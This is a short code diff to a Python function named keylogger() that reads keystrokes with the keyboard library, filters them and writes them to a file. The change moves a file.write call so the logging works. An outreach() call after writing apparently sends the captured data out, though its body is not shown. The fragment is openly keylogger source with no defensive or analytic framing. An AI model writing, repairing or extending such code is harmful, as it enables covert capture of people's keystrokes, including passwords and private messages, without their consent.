@@ -38,6 +38,7 @@ def keylogger():
             char = keyboard.read_key()
             for i in allchars:
                 if char == i:
+                    file.write(char)
                     continue
                 else:
                     char = ''
@@ -54,7 +55,6 @@ def keylogger():
                 file.write(char)
                 outreach()
 
-            file.write(char)
             file.close()
 
 if __name__ == '__main__':
